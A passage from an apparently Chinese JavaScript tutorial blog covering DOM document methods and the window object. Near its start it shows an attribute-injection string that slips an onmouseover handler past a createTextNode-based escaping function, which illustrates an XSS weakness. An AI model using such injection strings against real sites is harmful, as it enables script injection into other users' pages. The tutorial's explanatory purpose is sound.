<p>需要注意的是，该方法不对单引号和双引号转义，所以不能用来对 HTML 属性赋值。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escapeHtml</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> div = <span class="built_in">document</span>.createElement(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line">  div.appendChild(<span class="built_in">document</span>.createTextNode(str));</span><br><span class="line">  <span class="keyword">return</span> div.innerHTML;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> userWebsite = <span class="string">&#x27;&quot; onmouseover=&quot;alert(\&#x27;derp\&#x27;)&quot; &quot;&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> profileLink = <span class="string">&#x27;&lt;a href=&quot;&#x27;</span> + escapeHtml(userWebsite) + <span class="string">&#x27;&quot;&gt;Bob&lt;/a&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> div = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;target&#x27;</span>);</span><br><span class="line">div.innerHTML = profileLink;</span><br><span class="line"><span class="comment">// &lt;a href=&quot;&quot; onmouseover=&quot;alert(&#x27;derp&#x27;)&quot; &quot;&quot;&gt;Bob&lt;/a&gt;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，由于<code>createTextNode</code>方法不转义双引号，导致<code>onmouseover</code>方法被注入了代码。</p>
<h5 id="5-3-11-document-createAttribute"><a href="#5-3-11-document-createAttribute" class="headerlink" title="5.3.11 document.createAttribute()"></a>5.3.11 document.createAttribute()</h5><p><code>document.createAttribute</code>方法生成一个新的属性节点（<code>Attr</code>实例），并返回它。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> attribute = <span class="built_in">document</span>.createAttribute(name);</span><br></pre></td></tr></table></figure>
<p><code>document.createAttribute</code>方法的参数<code>name</code>，是属性的名称。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> node = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;div1&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = <span class="built_in">document</span>.createAttribute(<span class="string">&#x27;my_attrib&#x27;</span>);</span><br><span class="line">a.value = <span class="string">&#x27;newVal&#x27;</span>;</span><br><span class="line"></span><br><span class="line">node.setAttributeNode(a);</span><br><span class="line"><span class="comment">// 或者</span></span><br><span class="line">node.setAttribute(<span class="string">&#x27;my_attrib&#x27;</span>, <span class="string">&#x27;newVal&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>上面代码为<code>div1</code>节点，插入一个值为<code>newVal</code>的<code>my_attrib</code>属性。</p>
<h5 id="5-3-12-document-createComment"><a href="#5-3-12-document-createComment" class="headerlink" title="5.3.12 document.createComment()"></a>5.3.12 document.createComment()</h5><p><code>document.createComment</code>方法生成一个新的注释节点，并返回该节点。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> CommentNode = <span class="built_in">document</span>.createComment(data);</span><br></pre></td></tr></table></figure>
<p><code>document.createComment</code>方法的参数是一个字符串，会成为注释节点的内容。</p>
<h5 id="5-3-13-document-createDocumentFragment"><a href="#5-3-13-document-createDocumentFragment" class="headerlink" title="5.3.13 document.createDocumentFragment()"></a>5.3.13 document.createDocumentFragment()</h5><p><code>document.createDocumentFragment</code>方法生成一个空的文档片段对象（<code>DocumentFragment</code>实例）。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> docFragment = <span class="built_in">document</span>.createDocumentFragment();</span><br></pre></td></tr></table></figure>
<p><code>DocumentFragment</code>是一个存在于内存的 DOM 片段，不属于当前文档，常常用来生成一段较复杂的 DOM 结构，然后再插入当前文档。这样做的好处在于，因为<code>DocumentFragment</code>不属于当前文档，对它的任何改动，都不会引发网页的重新渲染，比直接修改当前文档的 DOM 有更好的性能表现。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> docfrag = <span class="built_in">document</span>.createDocumentFragment();</span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>].forEach(<span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> li = <span class="built_in">document</span>.createElement(<span class="string">&#x27;li&#x27;</span>);</span><br><span class="line">  li.textContent = e;</span><br><span class="line">  docfrag.appendChild(li);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> element  = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;ul&#x27;</span>);</span><br><span class="line">element.appendChild(docfrag);</span><br></pre></td></tr></table></figure>
<p>上面代码中，文档片断<code>docfrag</code>包含四个<code>&lt;li&gt;</code>节点，这些子节点被一次性插入了当前文档。</p>
<h5 id="5-3-14-document-createEvent"><a href="#5-3-14-document-createEvent" class="headerlink" title="5.3.14 document.createEvent()"></a>5.3.14 document.createEvent()</h5><p><code>document.createEvent</code>方法生成一个事件对象（<code>Event</code>实例），该对象可以被<code>element.dispatchEvent</code>方法使用，触发指定事件。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> event = <span class="built_in">document</span>.createEvent(type);</span><br></pre></td></tr></table></figure>
<p><code>document.createEvent</code>方法的参数是事件类型，比如<code>UIEvents</code>、<code>MouseEvents</code>、<code>MutationEvents</code>、<code>HTMLEvents</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> event = <span class="built_in">document</span>.createEvent(<span class="string">&#x27;Event&#x27;</span>);</span><br><span class="line">event.initEvent(<span class="string">&#x27;build&#x27;</span>, <span class="literal">true</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.addEventListener(<span class="string">&#x27;build&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(e.type); <span class="comment">// &quot;build&quot;</span></span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br><span class="line"><span class="built_in">document</span>.dispatchEvent(event);</span><br></pre></td></tr></table></figure>
<p>上面代码新建了一个名为<code>build</code>的事件实例，然后触发该事件。</p>
<h5 id="5-3-15-document-addEventListener-，document-removeEventListener-，document-dispatchEvent"><a href="#5-3-15-document-addEventListener-，document-removeEventListener-，document-dispatchEvent" class="headerlink" title="5.3.15 document.addEventListener()，document.removeEventListener()，document.dispatchEvent()"></a>5.3.15 document.addEventListener()，document.removeEventListener()，document.dispatchEvent()</h5><p>这三个方法用于处理<code>document</code>节点的事件。它们都继承自<code>EventTarget</code>接口，详细介绍参见《EventTarget 接口》一章。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 添加事件监听函数</span></span><br><span class="line"><span class="built_in">document</span>.addEventListener(<span class="string">&#x27;click&#x27;</span>, listener, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 移除事件监听函数</span></span><br><span class="line"><span class="built_in">document</span>.removeEventListener(<span class="string">&#x27;click&#x27;</span>, listener, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 触发事件</span></span><br><span class="line"><span class="keyword">var</span> event = <span class="keyword">new</span> Event(<span class="string">&#x27;click&#x27;</span>);</span><br><span class="line"><span class="built_in">document</span>.dispatchEvent(event);</span><br></pre></td></tr></table></figure>

<h5 id="5-3-16-document-hasFocus"><a href="#5-3-16-document-hasFocus" class="headerlink" title="5.3.16 document.hasFocus()"></a>5.3.16 document.hasFocus()</h5><p><code>document.hasFocus</code>方法返回一个布尔值，表示当前文档之中是否有元素被激活或获得焦点。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> focused = <span class="built_in">document</span>.hasFocus();</span><br></pre></td></tr></table></figure>
<p>注意，有焦点的文档必定被激活（active），反之不成立，激活的文档未必有焦点。比如，用户点击按钮，从当前窗口跳出一个新窗口，该新窗口就是激活的，但是不拥有焦点。</p>
<h5 id="5-3-17-document-adoptNode-，document-importNode"><a href="#5-3-17-document-adoptNode-，document-importNode" class="headerlink" title="5.3.17 document.adoptNode()，document.importNode()"></a>5.3.17 document.adoptNode()，document.importNode()</h5><p><code>document.adoptNode</code>方法将某个节点及其子节点，从原来所在的文档或<code>DocumentFragment</code>里面移除，归属当前<code>document</code>对象，返回插入后的新节点。插入的节点对象的<code>ownerDocument</code>属性，会变成当前的<code>document</code>对象，而<code>parentNode</code>属性是<code>null</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> node = <span class="built_in">document</span>.adoptNode(externalNode);</span><br><span class="line"><span class="built_in">document</span>.appendChild(node);</span><br></pre></td></tr></table></figure>
<p>注意，<code>document.adoptNode</code>方法只是改变了节点的归属，并没有将这个节点插入新的文档树。所以，还要再用<code>appendChild</code>方法或<code>insertBefore</code>方法，将新节点插入当前文档树。</p>
<p><code>document.importNode</code>方法则是从原来所在的文档或<code>DocumentFragment</code>里面，拷贝某个节点及其子节点，让它们归属当前<code>document</code>对象。拷贝的节点对象的<code>ownerDocument</code>属性，会变成当前的<code>document</code>对象，而<code>parentNode</code>属性是<code>null</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> node = <span class="built_in">document</span>.importNode(externalNode, deep);</span><br></pre></td></tr></table></figure>
<p><code>document.importNode</code>方法的第一个参数是外部节点，第二个参数是一个布尔值，表示对外部节点是深拷贝还是浅拷贝，默认是浅拷贝（<code>false</code>）。虽然第二个参数是可选的，但是建议总是保留这个参数，并设为<code>true</code>。</p>
<p>注意，<code>document.importNode</code>方法只是拷贝外部节点，这时该节点的父节点是<code>null</code>。下一步还必须将这个节点插入当前文档树。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> iframe = <span class="built_in">document</span>.getElementsByTagName(<span class="string">&#x27;iframe&#x27;</span>)[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">var</span> oldNode = iframe.contentWindow.document.getElementById(<span class="string">&#x27;myNode&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> newNode = <span class="built_in">document</span>.importNode(oldNode, <span class="literal">true</span>);</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">&quot;container&quot;</span>).appendChild(newNode);</span><br></pre></td></tr></table></figure>
<p>上面代码从<code>iframe</code>窗口，拷贝一个指定节点<code>myNode</code>，插入当前文档。</p>
<h5 id="5-3-18-document-createNodeIterator"><a href="#5-3-18-document-createNodeIterator" class="headerlink" title="5.3.18 document.createNodeIterator()"></a>5.3.18 document.createNodeIterator()</h5><p><code>document.createNodeIterator</code>方法返回一个子节点遍历器。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> nodeIterator = <span class="built_in">document</span>.createNodeIterator(</span><br><span class="line">  <span class="built_in">document</span>.body,</span><br><span class="line">  NodeFilter.SHOW_ELEMENT</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p>上面代码返回<code>&lt;body&gt;</code>元素子节点的遍历器。</p>
<p><code>document.createNodeIterator</code>方法第一个参数为所要遍历的根节点，第二个参数为所要遍历的节点类型，这里指定为元素节点（<code>NodeFilter.SHOW_ELEMENT</code>）。几种主要的节点类型写法如下。</p>
<ul>
<li>所有节点：<code>NodeFilter.SHOW_ALL</code></li>
<li>元素节点：<code>NodeFilter.SHOW_ELEMENT</code></li>
<li>文本节点：<code>NodeFilter.SHOW_TEXT</code></li>
<li>评论节点：<code>NodeFilter.SHOW_COMMENT</code></li>
</ul>
<p><code>document.createNodeIterator</code>方法返回一个“遍历器”对象（<code>NodeFilter</code>实例）。该实例的<code>nextNode()</code>方法和<code>previousNode()</code>方法，可以用来遍历所有子节点。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> nodeIterator = <span class="built_in">document</span>.createNodeIterator(<span class="built_in">document</span>.body);</span><br><span class="line"><span class="keyword">var</span> pars = [];</span><br><span class="line"><span class="keyword">var</span> currentNode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (currentNode = nodeIterator.nextNode()) &#123;</span><br><span class="line">  pars.push(currentNode);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码中，使用遍历器的<code>nextNode</code>方法，将根节点的所有子节点，依次读入一个数组。<code>nextNode</code>方法先返回遍历器的内部指针所在的节点，然后会将指针移向下一个节点。所有成员遍历完成后，返回<code>null</code>。<code>previousNode</code>方法则是先将指针移向上一个节点，然后返回该节点。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> nodeIterator = <span class="built_in">document</span>.createNodeIterator(</span><br><span class="line">  <span class="built_in">document</span>.body,</span><br><span class="line">  NodeFilter.SHOW_ELEMENT</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> currentNode = nodeIterator.nextNode();</span><br><span class="line"><span class="keyword">var</span> previousNode = nodeIterator.previousNode();</span><br><span class="line"></span><br><span class="line">currentNode === previousNode <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>currentNode</code>和<code>previousNode</code>都指向同一个的节点。</p>
<p>注意，遍历器返回的第一个节点，总是根节点。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">pars[<span class="number">0</span>] === <span class="built_in">document</span>.body <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<h5 id="5-3-19-document-createTreeWalker"><a href="#5-3-19-document-createTreeWalker" class="headerlink" title="5.3.19 document.createTreeWalker()"></a>5.3.19 document.createTreeWalker()</h5><p><code>document.createTreeWalker</code>方法返回一个 DOM 的子树遍历器。它与<code>document.createNodeIterator</code>方法基本是类似的，区别在于它返回的是<code>TreeWalker</code>实例，后者返回的是<code>NodeIterator</code>实例。另外，它的第一个节点不是根节点。</p>
<p><code>document.createTreeWalker</code>方法的第一个参数是所要遍历的根节点，第二个参数指定所要遍历的节点类型（与<code>document.createNodeIterator</code>方法的第二个参数相同）。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> treeWalker = <span class="built_in">document</span>.createTreeWalker(</span><br><span class="line">  <span class="built_in">document</span>.body,</span><br><span class="line">  NodeFilter.SHOW_ELEMENT</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> nodeList = [];</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(treeWalker.nextNode()) &#123;</span><br><span class="line">  nodeList.push(treeWalker.currentNode);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码遍历<code>&lt;body&gt;</code>节点下属的所有元素节点，将它们插入<code>nodeList</code>数组。</p>
<h5 id="5-3-20-document-execCommand-，document-queryCommandSupported-，document-queryCommandEnabled"><a href="#5-3-20-document-execCommand-，document-queryCommandSupported-，document-queryCommandEnabled" class="headerlink" title="5.3.20 document.execCommand()，document.queryCommandSupported()，document.queryCommandEnabled()"></a>5.3.20 document.execCommand()，document.queryCommandSupported()，document.queryCommandEnabled()</h5><h6 id="1-document-execCommand"><a href="#1-document-execCommand" class="headerlink" title="(1)document.execCommand()"></a>(1)document.execCommand()</h6><p>如果<code>document.designMode</code>属性设为<code>on</code>，那么整个文档用户可编辑；如果元素的<code>contenteditable</code>属性设为<code>true</code>，那么该元素可编辑。这两种情况下，可以使用<code>document.execCommand()</code>方法，改变内容的样式，比如<code>document.execCommand(&#39;bold&#39;)</code>会使得字体加粗。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.execCommand(command, showDefaultUI, input)</span><br></pre></td></tr></table></figure>
<p>该方法接受三个参数。</p>
<ul>
<li><code>command</code>：字符串，表示所要实施的样式。</li>
<li><code>showDefaultUI</code>：布尔值，表示是否要使用默认的用户界面，建议总是设为<code>false</code>。</li>
<li><code>input</code>：字符串，表示该样式的辅助内容，比如生成超级链接时，这个参数就是所要链接的网址。如果第二个参数设为<code>true</code>，那么浏览器会弹出提示框，要求用户在提示框输入该参数。但是，不是所有浏览器都支持这样做，为了兼容性，还是需要自己部署获取这个参数的方式。</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> url = <span class="built_in">window</span>.prompt(<span class="string">&#x27;请输入网址&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (url) &#123;</span><br><span class="line">  <span class="built_in">document</span>.execCommand(<span class="string">&#x27;createlink&#x27;</span>, <span class="literal">false</span>, url);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码中，先提示用户输入所要链接的网址，然后手动生成超级链接。注意，第二个参数是false，表示此时不需要自动弹出提示框。</p>
<p><code>document.execCommand()</code>的返回值是一个布尔值。如果为<code>false</code>，表示这个方法无法生效。</p>
<p>这个方法大部分情况下，只对选中的内容生效。如果有多个内容可编辑区域，那么只对当前焦点所在的元素生效。</p>
<p><code>document.execCommand()</code>方法可以执行的样式改变有很多种，下面是其中的一些：bold、insertLineBreak、selectAll、createLink、insertOrderedList、subscript、delete、insertUnorderedList、superscript、formatBlock、insertParagraph、undo、forwardDelete、insertText、unlink、insertImage、italic、unselect、insertHTML、redo。这些值都可以用作第一个参数，它们的含义不难从字面上看出来。</p>
<h6 id="2-document-queryCommandSupported"><a href="#2-document-queryCommandSupported" class="headerlink" title="(2)document.queryCommandSupported()"></a>(2)document.queryCommandSupported()</h6><p><code>document.queryCommandSupported()</code>方法返回一个布尔值，表示浏览器是否支持<code>document.execCommand()</code>的某个命令。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">document</span>.queryCommandSupported(<span class="string">&#x27;SelectAll&#x27;</span>)) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;浏览器支持选中可编辑区域的所有内容&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="3-document-queryCommandEnabled"><a href="#3-document-queryCommandEnabled" class="headerlink" title="(3)document.queryCommandEnabled()"></a>(3)document.queryCommandEnabled()</h6><p><code>document.queryCommandEnabled()</code>方法返回一个布尔值，表示当前是否可用<code>document.execCommand()</code>的某个命令。比如，<code>bold</code>（加粗）命令只有存在文本选中时才可用，如果没有选中文本，就不可用。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML 代码为</span></span><br><span class="line"><span class="comment">// &lt;input type=&quot;button&quot; value=&quot;Copy&quot; onclick=&quot;doCopy()&quot;&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doCopy</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="comment">// 浏览器是否支持 copy 命令（选中内容复制到剪贴板）</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">document</span>.queryCommandSupported(<span class="string">&#x27;copy&#x27;</span>)) &#123;</span><br><span class="line">    copyText(<span class="string">&#x27;你好&#x27;</span>);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;浏览器不支持&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">copyText</span>(<span class="params">text</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> input = <span class="built_in">document</span>.createElement(<span class="string">&#x27;textarea&#x27;</span>);</span><br><span class="line">  <span class="built_in">document</span>.body.appendChild(input);</span><br><span class="line">  input.value = text;</span><br><span class="line">  input.focus();</span><br><span class="line">  input.select();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 当前是否有选中文字</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">document</span>.queryCommandEnabled(<span class="string">&#x27;copy&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">var</span> success = <span class="built_in">document</span>.execCommand(<span class="string">&#x27;copy&#x27;</span>);</span><br><span class="line">    input.remove();</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;Copy Ok&#x27;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;queryCommandEnabled is false&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码中，先判断浏览器是否支持<code>copy</code>命令（允许可编辑区域的选中内容，复制到剪贴板），如果支持，就新建一个临时文本框，里面写入内容“你好”，并将其选中。然后，判断是否选中成功，如果成功，就将“你好”复制到剪贴板，再删除那个临时文本框。</p>
<h5 id="5-3-21-document-getSelection"><a href="#5-3-21-document-getSelection" class="headerlink" title="5.3.21 document.getSelection()"></a>5.3.21 document.getSelection()</h5><p>这个方法指向<code>window.getSelection()</code>，参见<code>window</code>对象一节的介绍。</p>
<p><code>Well,that&#39;s all for today</code></p>
]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS DOM-Document 节点</tag>
      </tags>
  </entry>
  <entry>
    <title>打卡0056</title>
    <url>/2021/05/30/%E6%89%93%E5%8D%A10056/</url>
    <content><![CDATA[<p><font color=#c77eb5>最好的时光在路上，一路向阳。</font></p>
<h2 id="JS-浏览器模型"><a href="#JS-浏览器模型" class="headerlink" title="JS 浏览器模型"></a>JS 浏览器模型</h2><h3 id="2-window-对象"><a href="#2-window-对象" class="headerlink" title="2. window 对象"></a>2. window 对象</h3><h4 id="2-1-概述"><a href="#2-1-概述" class="headerlink" title="2.1 概述"></a>2.1 概述</h4><p>浏览器里面，<code>window</code>对象（注意，<code>w</code>为小写）指当前的浏览器窗口。它也是当前页面的顶层对象，即最高一层的对象，所有其他对象都是它的下属。一个变量如果未声明，那么默认就是顶层对象的属性。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">a = <span class="number">1</span>;</span><br><span class="line"><span class="built_in">window</span>.a <span class="comment">// 1</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>a</code>是一个没有声明就直接赋值的变量，它自动成为顶层对象的属性。</p>
<p><code>window</code>有自己的实体含义，其实不适合当作最高一层的顶层对象，这是一个语言的设计失误。最早，设计这门语言的时候，原始设想是语言内置的对象越少越好，这样可以提高浏览器的性能。因此，语言设计者 Brendan Eich 就把<code>window</code>对象当作顶层对象，所有未声明就赋值的变量都自动变成<code>window</code>对象的属性。这种设计使得编译阶段无法检测出未声明变量，但到了今天已经没有办法纠正了。</p>
<span id="more"></span>
<h4 id="2-2-window-对象的属性"><a href="#2-2-window-对象的属性" class="headerlink" title="2.2 window 对象的属性"></a>2.2 window 对象的属性</h4><h5 id="2-2-1-window-name"><a href="#2-2-1-window-name" class="headerlink" title="2.2.1 window.name"></a>2.2.1 window.name</h5><p><code>window.name</code>属性是一个字符串，表示当前浏览器窗口的名字。窗口不一定需要名字，这个属性主要配合超链接和表单的<code>target</code>属性使用。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.name = <span class="string">&#x27;Hello World!&#x27;</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">window</span>.name)</span><br><span class="line"><span class="comment">// &quot;Hello World!&quot;</span></span><br></pre></td></tr></table></figure>
<p>该属性只能保存字符串，如果写入的值不是字符串，会自动转成字符串。各个浏览器对这个值的储存容量有所不同，但是一般来说，可以高达几MB。</p>
<p>只要浏览器窗口不关闭，这个属性是不会消失的。举例来说，访问<code>a.com</code>时，该页面的脚本设置了<code>window.name</code>，接下来在同一个窗口里面载入了<code>b.com</code>，新页面的脚本可以读到上一个网页设置的<code>window.name</code>。页面刷新也是这种情况。一旦浏览器窗口关闭后，该属性保存的值就会消失，因为这时窗口已经不存在了。</p>
<h5 id="2-2-2-window-closed，window-opener"><a href="#2-2-2-window-closed，window-opener" class="headerlink" title="2.2.2 window.closed，window.opener"></a>2.2.2 window.closed，window.opener</h5><p><code>window.closed</code>属性返回一个布尔值，表示窗口是否关闭。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.closed <span class="comment">// false</span></span><br></pre></td></tr></table></figure>
<p>上面代码检查当前窗口是否关闭。这种检查意义不大，因为只要能运行代码，当前窗口肯定没有关闭。这个属性一般用来检查，使用脚本打开的新窗口是否关闭。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> popup = <span class="built_in">window</span>.open();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((popup !== <span class="literal">null</span>) &amp;&amp; !popup.closed) &#123;</span><br><span class="line">  <span class="comment">// 窗口仍然打开着</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>window.opener</code>属性表示打开当前窗口的父窗口。如果当前窗口没有父窗口（即直接在地址栏输入打开），则返回<code>null</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.open().opener === <span class="built_in">window</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>上面表达式会打开一个新窗口，然后返回<code>true</code>。</p>
<p>如果两个窗口之间不需要通信，建议将子窗口的<code>opener</code>属性显式设为<code>null</code>，这样可以减少一些安全隐患。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> newWin = <span class="built_in">window</span>.open(<span class="string">&#x27;example.html&#x27;</span>, <span class="string">&#x27;newWindow&#x27;</span>, <span class="string">&#x27;height=400,width=400&#x27;</span>);</span><br><span class="line">newWin.opener = <span class="literal">null</span>;</span><br></pre></td></tr></table></figure>
<p>上面代码中，子窗口的<code>opener</code>属性设为<code>null</code>，两个窗口之间就没办法再联系了。</p>
<p>通过<code>opener</code>属性，可以获得父窗口的全局属性和方法，但只限于两个窗口同源的情况（参见《同源限制》一章），且其中一个窗口由另一个打开。<code>&lt;a&gt;</code>元素添加<code>rel=&quot;noopener&quot;</code>属性，可以防止新打开的窗口获取父窗口，减轻被恶意网站修改父窗口 URL 的风险。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;a href=<span class="string">&quot;https://an.evil.site&quot;</span> target=<span class="string">&quot;_blank&quot;</span> rel=<span class="string">&quot;noopener&quot;</span>&gt;</span><br><span class="line">恶意网站</span><br><span class="line">&lt;/a&gt;</span><br></pre></td></tr></table></figure>
<h5 id="2-2-3-window-self，window-window"><a href="#2-2-3-window-self，window-window" class="headerlink" title="2.2.3 window.self，window.window"></a>2.2.3 window.self，window.window</h5><p><code>window.self</code>和<code>window.window</code>属性都指向窗口本身。这两个属性只读。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.self === <span class="built_in">window</span> <span class="comment">// true</span></span><br><span class="line"><span class="built_in">window</span>.window === <span class="built_in">window</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<h5 id="2-2-4-window-frames，window-length"><a href="#2-2-4-window-frames，window-length" class="headerlink" title="2.2.4 window.frames，window.length"></a>2.2.4 window.frames，window.length</h5><p><code>window.frames</code>属性返回一个类似数组的对象，成员为页面内所有框架窗口，包括<code>frame</code>元素和<code>iframe</code>元素。<code>window.frames[0]</code>表示页面中第一个框架窗口。</p>
<p>如果<code>iframe</code>元素设置了<code>id</code>或<code>name</code>属性，那么就可以用属性值，引用这个<code>iframe</code>窗口。比如<code>&lt;iframe name=&quot;myIFrame&quot;&gt;</code>可以用<code>frames[&#39;myIFrame&#39;]</code>或者<code>frames.myIFrame</code>来引用。</p>
<p><code>frames</code>属性实际上是<code>window</code>对象的别名。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">frames === <span class="built_in">window</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>因此，<code>frames[0]</code>也可以用<code>window[0]</code>表示。但是，从语义上看，<code>frames</code>更清晰，而且考虑到<code>window</code>还是全局对象，因此推荐表示多窗口时，总是使用<code>frames[0]</code>的写法。更多介绍请看下文的《多窗口操作》部分。</p>
<p><code>window.length</code>属性返回当前网页包含的框架总数。如果当前网页不包含<code>frame</code>和<code>iframe</code>元素，那么<code>window.length</code>就返回<code>0</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.frames.length === <span class="built_in">window</span>.length <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>上面代码表示，<code>window.frames.length</code>与<code>window.length</code>应该是相等的。</p>
<h5 id="2-2-5-window-frameElement"><a href="#2-2-5-window-frameElement" class="headerlink" title="2.2.5 window.frameElement"></a>2.2.5 window.frameElement</h5><p><code>window.frameElement</code>属性主要用于当前窗口嵌在另一个网页的情况（嵌入<code>&lt;object&gt;</code>、<code>&lt;iframe&gt;</code>或<code>&lt;embed&gt;</code>元素），返回当前窗口所在的那个元素节点。如果当前窗口是顶层窗口，或者所嵌入的那个网页不是同源的，该属性返回<code>null</code>。</p>
